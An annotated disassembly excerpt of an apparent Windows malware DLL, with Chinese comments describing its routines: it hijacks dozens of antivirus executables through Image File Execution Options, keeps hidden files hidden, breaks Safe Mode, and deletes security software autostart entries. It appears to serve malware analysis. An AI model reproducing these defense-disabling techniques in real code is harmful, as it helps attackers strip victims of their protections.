
```asm
100023F8  |>  8D85 F4FDFFFF lea     eax, dword ptr [ebp-20C]
100023FE  |.  68 C8110010   push    100011C8
10002403  |.  50            push    eax
10002404  |.  E8 47100000   call    10003450
10002409  |.  8BF0          mov     esi, eax
1000240B  |.  83C4 08       add     esp, 8
1000240E  |.  85F6          test    esi, esi
10002410  |.  75 22         jnz     short 10002434
10002412  |.  50            push    eax                              ; /Style
10002413  |.  68 C0110010   push    100011C0                         ; |Title = "fuck"
10002418  |.  68 BC110010   push    100011BC                         ; |Text = "net"
1000241D  |.  6A FF         push    -1                               ; |hOwner = FFFFFFFF
1000241F  |.  FF15 E0100010 call    dword ptr [100010E0]             ; \MessageBoxA
10002425  |.  68 B8110010   push    100011B8                         ;  ASCII "51"
1000242A  |.  E8 1B100000   call    1000344A
1000242F  |.  83C4 04       add     esp, 4
10002432  |.  EB 40         jmp     short 10002474
10002434  |>  8D8D 2CFDFFFF lea     ecx, dword ptr [ebp-2D4]
1000243A  |.  51            push    ecx
1000243B  |.  68 B4110010   push    100011B4                         ;  ASCII "%s",LF
10002440  |.  56            push    esi
10002441  |.  E8 FE0F0000   call    10003444
10002446  |.  83C4 0C       add     esp, 0C
10002449  |.  83F8 01       cmp     eax, 1
1000244C  |.  75 26         jnz     short 10002474
1000244E  |>  8D95 2CFDFFFF /lea     edx, dword ptr [ebp-2D4]
10002454  |.  52            |push    edx
10002455  |.  E8 36FCFFFF   |call    10002090
1000245A  |.  8D85 2CFDFFFF |lea     eax, dword ptr [ebp-2D4]
10002460  |.  50            |push    eax
10002461  |.  68 B4110010   |push    100011B4                        ;  ASCII "%s",LF
10002466  |.  56            |push    esi
10002467  |.  E8 D80F0000   |call    10003444
1000246C  |.  83C4 10       |add     esp, 10
1000246F  |.  83F8 01       |cmp     eax, 1
10002472  |.^ 74 DA         \je      short 1000244E
10002474  |>  56            push    esi
10002475  |.  E8 C40F0000   call    1000343E
1000247A  |.  83C4 04       add     esp, 4
1000247D  |>  5F            pop     edi
1000247E  |.  5E            pop     esi
1000247F  |.  B8 01000000   mov     eax, 1
10002484  |.  5B            pop     ebx
10002485  |.  8BE5          mov     esp, ebp
10002487  |.  5D            pop     ebp
10002488  \.  C2 0400       retn    4
}
10002562    6A 00           push    0
10002564    6A 00           push    0
10002566    FFD6            call    esi
10002568    6A 00           push    0
1000256A    6A 00           push    0
1000256C    6A 00           push    0
1000256E    68 102D0010     push    10002D10
  {
10002D10    56              push    esi                              ; kernel32.Sleep
10002D11    8B35 94100010   mov     esi, dword ptr [10001094]        ; kernel32.Sleep
10002D17    68 401F0000     push    1F40
10002D1C    FFD6            call    esi
10002D1E    E8 CDFCFFFF     call    100029F0                 ;创建安全软件的镜像劫持
"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
{
100029F0    68 04190010     push    10001904                         ; ASCII "360rpt.EXE"
100029F5    E8 D6FDFFFF     call    100027D0
"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
100029FA    68 F0180010     push    100018F0                         ; ASCII "LiveUpdate360.EXE"
100029FF    E8 CCFDFFFF     call    100027D0
10002A04    68 E4180010     push    100018E4                         ; ASCII "360safe.EXE"
10002A09    E8 C2FDFFFF     call    100027D0
10002A0E    68 D8180010     push    100018D8                         ; ASCII "360tray.EXE"
10002A13    E8 B8FDFFFF     call    100027D0
10002A18    68 C8180010     push    100018C8                         ; ASCII "360safebox.EXE"
10002A1D    E8 AEFDFFFF     call    100027D0
10002A22    68 B8180010     push    100018B8                         ; ASCII "safeboxTray.EXE"
10002A27    E8 A4FDFFFF     call    100027D0
10002A2C    68 A8180010     push    100018A8                         ; ASCII "AvMonitor.EXE"
10002A31    E8 9AFDFFFF     call    100027D0
10002A36    68 98180010     push    10001898                         ; ASCII "Ravservice.EXE"
10002A3B    E8 90FDFFFF     call    100027D0
10002A40    68 8C180010     push    1000188C                         ; ASCII "RAVTRAY.EXE"
.............................................................................................
10002A45    E8 86FDFFFF     call    100027D0
10002CE0    68 48150010     push    10001548                         ; ASCII "mcshield.EXE"
10002CE5    E8 E6FAFFFF     call    100027D0
10002CEA    68 94150010     push    10001594                         ; ASCII "VsTskMgr.EXE"
10002CEF    E8 DCFAFFFF     call    100027D0
10002CF4    68 38150010     push    10001538                         ; ASCII "KSWebShield.EXE"
10002CF9    E8 D2FAFFFF     call    100027D0
10002CFE    83C4 34         add     esp, 34
10002D01    C3              retn
}
10002D23    E8 E8FBFFFF     call    10002910
{
10002910    55              push    ebp
10002911    8BEC            mov     ebp, esp
10002913    83EC 08         sub     esp, 8
10002916    C745 F8 0200000>mov     dword ptr [ebp-8], 2
1000291D    90              nop
1000291E    90              nop
1000291F    90              nop
10002920    90              nop
10002921    90              nop
10002922    90              nop
10002923    8D45 FC         lea     eax, dword ptr [ebp-4]
10002926    50              push    eax
10002927    68 3F000F00     push    0F003F
1000292C    6A 00           push    0
1000292E    68 98140010     push    10001498                         ; ASCII
；"SOFTWARE\Microsoft\Windows\CurrentVersion\explorer\advanced\folder\hidden\showall"
；修改注册表使隐藏文件属性失效，删除注册表相关键值破坏安全模式，阻止用户进入安全模式
10002933    68 02000080     push    80000002
10002938    FF15 04100010   call    dword ptr [10001004]             ; ADVAPI32.RegOpenKeyExA
1000293E    85C0            test    eax, eax
10002940    75 39           jnz     short 1000297B
10002942    8B55 FC         mov     edx, dword ptr [ebp-4]
10002945    8D4D F8         lea     ecx, dword ptr [ebp-8]
10002948    6A 04           push    4
1000294A    51              push    ecx
1000294B    6A 04           push    4
1000294D    50              push    eax
1000294E    68 88140010     push    10001488                         ; ASCII "CheckedValue"
10002953    52              push    edx
10002954    FF15 0C100010   call    dword ptr [1000100C]             ; ADVAPI32.RegSetValueExA
1000295A    85C0            test    eax, eax
1000295C    74 13           je      short 10002971
1000295E    8B45 FC         mov     eax, dword ptr [ebp-4]
10002961    50              push    eax
10002962    FF15 1C100010   call    dword ptr [1000101C]             ; ADVAPI32.RegCloseKey
10002968    B8 01000000     mov     eax, 1
1000296D    8BE5            mov     esp, ebp
1000296F    5D              pop     ebp
10002970    C3              retn
}
10002D28    E8 63FCFFFF     call    10002990
  {
10002990    E8 6BFCFFFF     call    10002600                     ；阻止进入安全模式
10002995    E8 A6FDFFFF     call    10002740                      ；阻止网络连接安全模式
1000299A    68 2C150010     push    1000152C                         ; ASCII "360Safetray"
1000299F    E8 FCFCFFFF     call    100026A0                      ；删除安全软件自启动项
100029A4    68 20150010     push    10001520                         ; ASCII "360Safebox"
100029A9    E8 F2FCFFFF     call    100026A0
100029AE    68 14150010     push    10001514                         ; ASCII "KavStart"
100029B3    E8 E8FCFFFF     call    100026A0
100029B8    68 0C150010     push    1000150C                         ; ASCII "vptray"
100029BD    E8 DEFCFFFF     call    100026A0
100029C2    68 04150010     push    10001504                         ; ASCII "ccApp"
```
